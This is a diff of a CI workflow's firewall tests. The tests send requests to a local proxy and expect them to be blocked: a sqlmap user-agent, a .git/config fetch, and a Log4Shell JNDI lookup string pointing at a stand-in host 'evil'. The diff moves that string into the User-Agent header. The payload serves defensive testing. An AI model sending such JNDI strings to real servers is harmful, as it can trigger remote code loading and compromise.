@@ -290,7 +290,7 @@ jobs:
           # Managed ruleset classes the plugin chain never inspected.
           check 403 "$(code -H 'Host: app.example.test' -H 'User-Agent: sqlmap/1.7.2' http://localhost:18080/)" "scanner user-agent blocked" || rc=1
           check 403 "$(code -H 'Host: app.example.test' http://localhost:18080/.git/config)" "vcs config file blocked" || rc=1
-          check 403 "$(code -H 'Host: app.example.test' -H 'X-Api-Version: ${jndi:ldap://evil/a}' http://localhost:18080/)" "log4shell header blocked" || rc=1
+          check 403 "$(code -H 'Host: app.example.test' -H 'User-Agent: ${jndi:ldap://evil/a}' http://localhost:18080/)" "log4shell user-agent blocked" || rc=1
 
           # An unconfigured host must not be forwarded anywhere.
           check 404 "$(code -H 'Host: otro.example.test' http://localhost:18080/)" "unknown host refused" || rc=1
